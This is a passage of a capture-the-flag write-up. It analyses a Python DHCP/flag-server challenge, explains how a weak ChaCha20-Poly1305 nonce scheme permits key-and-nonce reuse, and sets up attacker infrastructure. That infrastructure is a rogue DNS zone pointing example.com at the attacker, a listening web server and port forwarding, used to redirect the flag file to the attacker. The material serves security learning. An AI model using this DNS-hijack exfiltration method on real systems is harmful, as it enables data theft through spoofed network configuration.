<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20_Poly1305<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_msg</span>(<span class="hljs-params">msg, nonce</span>):<br>    <span class="hljs-comment"># In case our RNG nonce is repeated, we also hash</span><br>    <span class="hljs-comment"># the message in. This means the worst-case scenario</span><br>    <span class="hljs-comment"># is that our nonce reflects a hash of the message</span><br>    <span class="hljs-comment"># but saves the chance of a nonce being reused across</span><br>    <span class="hljs-comment"># different messages</span><br>    nonce = sha256(msg[:<span class="hljs-number">32</span>] + nonce[:<span class="hljs-number">32</span>])[:<span class="hljs-number">12</span>]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    ct, tag = cipher.encrypt_and_digest(msg)<br><br>    <span class="hljs-keyword">return</span> ct+tag+nonce<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_msg</span>(<span class="hljs-params">msg</span>):<br>    ct = msg[:-<span class="hljs-number">28</span>]<br>    tag = msg[-<span class="hljs-number">28</span>:-<span class="hljs-number">12</span>]<br>    nonce = msg[-<span class="hljs-number">12</span>:]<br><br>    cipher = ChaCha20_Poly1305.new(key=CHACHA_KEY, nonce=nonce)<br>    pt = cipher.decrypt_and_verify(ct, tag)<br><br>    <span class="hljs-keyword">return</span> pt<br></code></pre></td></tr></table></figure>
<p>A couple of things to note here:</p>
<ul>
<li>Typically youâ€™re able to reuse the key for ChaCha20_Poly1305, as long as youâ€™re using a different nonce for each message encryption; otherwise this algorithm is known to lose confidentiality for messages encrypted using the same nonce.</li>
<li>Assuming an attacker can control the first 32 bytes of the <code>message</code> and the <code>nonce</code> parameters, the nonce used during the encryption can suffer from a <code>key and nonce reuse attack</code> depending on the provided parameters.</li>
<li>The <code>decrypt_msg</code> function does not validate that the <code>nonce</code>, supplied with the encrypted message <code>msg</code>, adheres to the pattern used to contruct the <code>nonce</code> in the <code>encrypt_msg</code> function.</li>
<li>Both the <code>encrypt_msg</code> and the <code>decrypt_msg</code> functions use the same static key <code>CHACHA_KEY</code> for the <strong>ChaCha20_Poly1305</strong> cipher.</li>
</ul>
<p>Lastly, thereâ€™s the custom <code>curl</code> function, which looks like itâ€™s trying to resolve a domain using a specified <strong>DNS server</strong> instance and then sending an http <strong>GET</strong> request to the corresponding IP address. Weâ€™ll come back to this once we analyze the <strong>FlagServer</strong>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dns.resolver<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">curl</span>(<span class="hljs-params">url, path, dns</span>):<br>    ip = <span class="hljs-built_in">str</span>(dns.resolve(url).response.resolve_chaining().answer).strip().split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>]<br>    url = <span class="hljs-string">&quot;http://&quot;</span> + ip<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending flage to <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>    requests.get(url + path)<br></code></pre></td></tr></table></figure>

<h3 id="DhcpServer"><a href="#DhcpServer" class="headerlink" title="DhcpServer"></a>DhcpServer</h3><p>Now that weâ€™ve seen the helper functions, letâ€™s come back to the server classes: Starting with the <strong>DhcpServer</strong>.</p>
<p>The <code>__init__</code> function of this class declares two lists <code>leases</code> and <code>ips</code> which will contain the provided leases and the available ips for this DhcpServer. Additionally, it sets its <strong>MAC address</strong> to the static hex value <code>1b 7d 6f 49 37 c9</code>, sets its gateway to <code>192.168.1.1</code>, and leases out the IP address <code>192.168.1.2</code> to a server named <code>rngserver_0</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DHCPServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.leases = []<br>        self.ips = [<span class="hljs-string">f&quot;192.168.1.<span class="hljs-subst">&#123;i&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)]<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1b 7d 6f 49 37 c9&quot;</span>)<br>        self.gateway_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>        self.leases.append((<span class="hljs-string">&quot;192.168.1.2&quot;</span>, <span class="hljs-string">b&quot;rngserver_0&quot;</span>, time.time(), []))<br></code></pre></td></tr></table></figure>

<p>Now letâ€™s analyze the <code>process_pkt</code> function:</p>
<ul>
<li>We can deduce some of the structure of the packet data: Each packet is supposed to start with a 6 byte MAC address corresponding to the sender of the packet, followed by another 6 byte MAC address of the receiver of the packet. The rest of the packet will contain the actual message.</li>
<li>The DhcpServer will only process packets that are meant to be routed to it and donâ€™t originate from itself.</li>
<li>If the message does not start with a <code>0x01</code>-byte, the DhcpServer will reject the packet.</li>
<li>Otherwise it will interpret the message-content following the <code>0x01</code>-byte, which is reminiscent of a <strong>DHCP discovery message</strong>, as the server name, try to lease an IP address to it and construct and return a response packet, that follows the same structure of sender MAC address followed by receiver MAC address and the actual message, to the sender of the current packet.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>    <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>    src_mac = pkt[:<span class="hljs-number">6</span>]<br>    dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>    msg = pkt[<span class="hljs-number">12</span>:]<br><br>    <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> src_mac == self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x01&quot;</span>):<br>        <span class="hljs-comment"># lease request</span><br>        dev_name = msg[<span class="hljs-number">1</span>:]<br>        lease_resp = self.get_lease(dev_name)<br>        <span class="hljs-keyword">return</span> (<br>            self.mac +<br>            src_mac + <span class="hljs-comment"># dest mac</span><br>            lease_resp<br>        )<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p>The <code>get_lease</code> function, which processes the <strong>DHCP discovery message</strong>, will try to handout any unused IP address from the <code>ips</code>-list first and if all of them are in use, it will relinquish the oldest lease and reuse and handout that same IP address once more.</p>
<p><strong>Note</strong>: If an actual DHCP server was to behave like this, modern networks would break all the time, because multiple devices would use the same IP address, which is supposed to be unique to a single device for the timeframe of the lease, which this DhcpServer implementation does not respect.</p>
<p>Finally this function will construct a response packet similar to a <strong>DHCP offer message</strong>, even replying with some of the possible <strong>DHCP options</strong>.</p>
<ul>
<li>The main difference from the official <strong>DHCP protocol</strong> is that the majority of the response is encrypted. Additionally, a checksum computed on the unencrypted packet is appended to the end of the response.</li>
<li>Another notable piece of information are the two DNS server IP addresses given inside the response packet, which are statically set to <code>8.8.8.8</code> and <code>8.8.4.4</code> by the <strong>DhcpServer</strong>. Weâ€™ll come back to this when analyzing the FlagServer.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lease</span>(<span class="hljs-params">self, dev_name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.ips) != <span class="hljs-number">0</span>:<br>        ip = self.ips.pop(<span class="hljs-number">0</span>)<br>        self.leases.append((ip, dev_name, time.time(), []))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># relinquish the oldest lease</span><br>        old_lease = self.leases.pop(<span class="hljs-number">0</span>)<br>        ip = old_lease[<span class="hljs-number">0</span>]<br>        self.leases.append((ip, dev_name, time.time(), []))<br><br>    pkt = <span class="hljs-built_in">bytearray</span>(<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) +<br>        <span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) +<br>        dev_name +<br>        <span class="hljs-string">b&quot;\x00&quot;</span><br>    )<br><br>    pkt = <span class="hljs-string">b&quot;\x02&quot;</span> + encrypt_msg(pkt, self.get_entropy_from_lavalamps()) + calc_crc(pkt)<br><br>    <span class="hljs-keyword">return</span> pkt<br></code></pre></td></tr></table></figure>
Taking a deeper dive into the packet encryption, weâ€™ll notice two things:</li>
</ul>
<ol>
<li>The <code>dev_name</code> part of the response packet is fully controlled by the sender of the <strong>DHCP discovery message</strong>, as weâ€™ll see when analyzing the <strong>FlagServer</strong> and the intended structure of such a discovery message. The only pseudo restriction on this part is a trailing <code>0x00</code>-byte, which the sender is not supposed to change, but thereâ€™s no actual check for that byte.</li>
<li>The <code>nonce</code> passed into the <code>encrypt_msg</code> function is generated using the <code>get_entropy_from_lavalamps</code> function, which weâ€™ll take a look at right now:</li>
</ol>
<p>There are two cases for this function:</p>
<ol>
<li>If the <strong>DhcpServer</strong> instance does not contain an active <code>lease</code> for a server containing <code>rngserver</code> in the server name, then the <code>get_entropy_from_lavalamps</code> function will just return <code>sha256(RNG_INIT)</code>.</li>
<li>On the other hand, if the <strong>DhcpServer</strong> does contain an active <code>lease</code> for a server containing <code>rngserver</code> in its name, then the result of the <code>get_entropy_from_lavalamps</code> function will be altered by appending some additional data to the argument of the SHA256 computation.</li>
</ol>
<p>Thus, for the sake of simplicity, we should try to achieve the first case and get a static return value from this funtion to incur a <strong>key and nonce reuse</strong> in the <code>encrypt_msg</code> function. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_entropy_from_lavalamps</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># Get entropy from all available lava-lamp RNG servers</span><br>    <span class="hljs-comment"># Falling back to local RNG if necessary</span><br>    entropy_pool = RNG_INIT<br><br>    <span class="hljs-keyword">for</span> ip, name, ts, tags <span class="hljs-keyword">in</span> self.leases:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;rngserver&quot;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># get entropy from the server</span><br>                output = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;ip&#125;</span>/get_rng&quot;</span>, timeout=TIMEOUT).text<br>                entropy_pool += sha256(output.encode())<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-comment"># if the server is broken, get randomness from local RNG instead</span><br>                entropy_pool += sha256(secrets.token_bytes(<span class="hljs-number">512</span>))<br><br>    <span class="hljs-keyword">return</span> sha256(entropy_pool)<br></code></pre></td></tr></table></figure>

<h3 id="FlagServer"><a href="#FlagServer" class="headerlink" title="FlagServer"></a>FlagServer</h3><p>Finally letâ€™s analyze the <strong>FlagServer</strong>:</p>
<p>Similarly to the <strong>DhcpServer</strong>, the <strong>FlagServer</strong> also initializes its own <strong>MAC address</strong>. Additionally it sets up its own <strong>DNS resolver</strong> and initializes this <code>dns</code> instance and its own network settings by talking to the <strong>DhcpServer</strong> and asking it for the appropriate settings.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, dhcp</span>):<br>        self.mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;53 79 82 b5 97 eb&quot;</span>)<br>        self.dns = dns.resolver.Resolver()<br>        self.process_pkt(dhcp.process_pkt(self.mac+dhcp.mac+<span class="hljs-string">b&quot;\x01&quot;</span>+<span class="hljs-string">b&quot;flag_server&quot;</span>))<br></code></pre></td></tr></table></figure>

<p>The <strong>FlagSever</strong> is going to process the response of the <strong>DhcpServer</strong> using its own <code>process_pkt</code> function. This function, similar to the <strong>DhcpServer</strong>â€˜s analogue, also parses the first 12 bytes into two different <strong>MAC addresses</strong> and checks those to see if it even has to process the received packet - in the same way, the <strong>DhcpServer</strong> does. And again, the remainder of the packet data is being considered the actual message part of the packet.</p>
<p>Besides that, the <strong>FlagServer</strong> can execute two functions depending on the incoming message <code>msg</code>.</p>
<ul>
<li>If the <code>msg</code> starts with a <code>0x02</code>-byte, it will parse and process the supplied <strong>DHCP offer message</strong>:<ol>
<li>After stripping the static <code>0x02</code>-byte from the front and the checksum from the end of the message, the <strong>FlagServer</strong> decrypts the provided ciphertext packet <code>pkt</code> and veryfies the contained <code>tag</code> using the also contianed <code>nonce</code> and the previously defined <code>decrypt_msg</code> function with the shared static encryption key <code>CHACHA_KEY</code>.</li>
<li>After decrypting the <strong>DHCP offer message</strong> <code>pkt</code>, the <strong>FlagServer</strong> also verifies the <strong>checksum</strong> attached to the message.</li>
<li>If all the checks pass, the <strong>FlagServer</strong> will then continue to configure its own settings based on the <strong>DHCP offer message</strong> and also configure their <code>dns</code> server to use the supplied <strong>DNS server ip addresses</strong>.</li>
</ol>
</li>
<li>If the <code>msg</code> starts with a <code>0x03</code>-byte, then the <strong>FlagServer</strong> is reading the file <code>flag.txt</code> and sending a http <strong>GET</strong> request to <code>http://example.com/&#123;flag&#125;</code> using its own <strong>DNS server</strong>.</li>
<li>Any other message will be rejected by this server.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pkt</span>(<span class="hljs-params">self, pkt</span>):<br>    <span class="hljs-keyword">assert</span> pkt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br>    src_mac = pkt[:<span class="hljs-number">6</span>]<br>    dst_mac = pkt[<span class="hljs-number">6</span>:<span class="hljs-number">12</span>]<br>    msg = pkt[<span class="hljs-number">12</span>:]<br><br>    <span class="hljs-keyword">if</span> dst_mac != self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> src_mac == self.mac:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x02&quot;</span>):<br>        <span class="hljs-comment"># lease response</span><br>        pkt = msg[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>]<br>        pkt = decrypt_msg(pkt)<br>        crc = msg[-<span class="hljs-number">4</span>:]<br>        <span class="hljs-keyword">assert</span> crc == calc_crc(pkt)<br><br>        self.ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>        self.gateway_ip = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])<br>        self.subnet_mask = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>])<br>        self.dns1 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>])<br>        self.dns2 = <span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pkt[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>])<br>        self.dns.nameservers = [self.dns1, self.dns2]<br>        <span class="hljs-keyword">assert</span> pkt.endswith(<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FLAG SERVER] [DEBUG] Got DHCP lease&quot;</span>, self.ip, self.gateway_ip, self.subnet_mask, self.dns1, self.dns2)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(msg) <span class="hljs-keyword">and</span> msg.startswith(<span class="hljs-string">b&quot;\x03&quot;</span>):<br>        <span class="hljs-comment"># FREE FLAGES!!!!!!!</span><br>        self.send_flag()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_flag</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        flag = f.read().strip()<br>    curl(<span class="hljs-string">&quot;example.com&quot;</span>, <span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>, self.dns)<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>After puzzling all of the pieces together, we are left with a clear plan of action:</p>
<ol>
<li>Forge a <strong>DHCP offer message</strong> and send it to the <strong>FlagServer</strong> to reconfigure their <strong>DNS server</strong> settings and have them point to us.</li>
<li>Setup our own <strong>DNS server</strong>, which maliciously tells the <strong>FlagServer</strong> that the domain <code>example.com</code> also belongs to us.</li>
<li>Setup our own web server, which is supposed to receive the messages send to <code>example.com</code> - coming from the <strong>FlagServer</strong>.</li>
<li>Send an other request to the <strong>FlagServer</strong> - this time using the <code>0x03</code>-byte message type - to make the <strong>FlagServer</strong> send the flag to, what they think is, <code>example.com</code>, i.e. us.</li>
<li>Receive the flag.</li>
</ol>
<p>Now letâ€™s explore the details of each of those steps in a slightly different order - weâ€™ll start off by setting up the required infrastructure:</p>
<h3 id="The-infrastructure"><a href="#The-infrastructure" class="headerlink" title="The infrastructure"></a>The infrastructure</h3><h4 id="1-Our-DNS-server"><a href="#1-Our-DNS-server" class="headerlink" title="1. Our DNS server"></a>1. Our DNS server</h4><p>To be able to receive the flag, weâ€™ll need to trick the <strong>FlagServer</strong> into thinking weâ€™re their actual <strong>DNS server</strong>, such that we can also tell it that all the requests meant for <code>example.com</code> should be send to us - including the flag!</p>
<p>So letâ€™s set up our own <strong>DNS server</strong>, using a somewhat easy to configure DNS-Server implemented in python, that perfectly suits our needs:</p>
<h4 id="1-1-Clone-the-respective-git-repository"><a href="#1-1-Clone-the-respective-git-repository" class="headerlink" title="1.1. Clone the respective git repository:"></a>1.1. Clone the respective git repository:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/akapila011/DNS-Server.git &amp;&amp; <span class="hljs-built_in">cd</span> DNS-Server/<br></code></pre></td></tr></table></figure>

<h4 id="1-2-Configure-the-server-to-run-on-the-appropriate-ip-address"><a href="#1-2-Configure-the-server-to-run-on-the-appropriate-ip-address" class="headerlink" title="1.2. Configure the server to run on the appropriate ip address:"></a>1.2. Configure the server to run on the appropriate ip address:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim Server.py<br></code></pre></td></tr></table></figure>

<p>Iâ€™m running the entire exploit on a Kali virtual machine, which is configured to be <strong>bridged</strong> on my host machine, thus Iâ€™ll have to use my <code>eth0</code>-interface ip <code>192.168.178.79</code> of that VM in this case.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> dns_generator <span class="hljs-keyword">import</span> ClientHandler<br><br><span class="hljs-comment"># Global variables</span><br>IP = <span class="hljs-string">&quot;192.168.178.79&quot;</span> <span class="hljs-comment"># &lt;-- Change this ip address to suit your needs</span><br>PORT = <span class="hljs-number">53</span> <span class="hljs-comment"># Default UPD port number for DNS; don&#x27;t change this without knowingwhat you&#x27;re doing, otherwise the FlagServer might not be able to reach you.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>    sock.bind((IP, PORT))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DNS Listening on &#123;0&#125;:&#123;1&#125; ...&quot;</span>.<span class="hljs-built_in">format</span>(IP, PORT))<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data, address = sock.recvfrom(<span class="hljs-number">650</span>)<br>        client = ClientHandler(address, data, sock)<br>        client.run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h4 id="1-3-Configure-a-Zone-file-for-the-example-com-domain-such-that-the-DNS-server-will-actually-respond-to-requests-for-example-com-and-will-return-our-public-ip-address"><a href="#1-3-Configure-a-Zone-file-for-the-example-com-domain-such-that-the-DNS-server-will-actually-respond-to-requests-for-example-com-and-will-return-our-public-ip-address" class="headerlink" title="1.3. Configure a Zone file for the example.com domain, such that the DNS server will actually respond to requests for example.com and will return our public ip address:"></a>1.3. Configure a <strong>Zone</strong> file for the <code>example.com</code> domain, such that the <strong>DNS server</strong> will actually respond to requests for <code>example.com</code> and will return our public ip address:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim ./Zones/example.com.zone<br></code></pre></td></tr></table></figure>
<p>Replace the ip address <code>127.0.0.1</code> in the <strong>A record</strong> with your public iaddress! <strong>Note</strong>, in my setup, this is not the same as the ip address used fomy virtual machine!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;<span class="hljs-variable">$origin</span>&quot;</span>: <span class="hljs-string">&quot;example.com&quot;</span>,<br>    <span class="hljs-string">&quot;<span class="hljs-variable">$ttl</span>&quot;</span>: 3600,<br><br>    <span class="hljs-string">&quot;a&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>,<br>        <span class="hljs-string">&quot;ttl&quot;</span>: 400,<br>        <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="1-4-Running-the-DNS-server"><a href="#1-4-Running-the-DNS-server" class="headerlink" title="1.4. Running the DNS server"></a>1.4. Running the <strong>DNS server</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo python ./Server.py<br></code></pre></td></tr></table></figure>

<h4 id="2-Our-web-server"><a href="#2-Our-web-server" class="headerlink" title="2. Our web server"></a>2. Our web server</h4><p>Running our own web server is as simple as running the following command:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">$ python -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<h4 id="3-Port-forwarding"><a href="#3-Port-forwarding" class="headerlink" title="3. Port forwarding"></a>3. Port forwarding</h4><p>If youâ€™re sitting behind a firewall, youâ€™ll need to configure it to forward the ports following ports to your machine - in my case to the VM: <code>80/tcp</code> and <code>53/udp</code>. Based on your firewall&#x2F;hardware configuration, youâ€™ll have to find your own instructions on how to do this.</p>
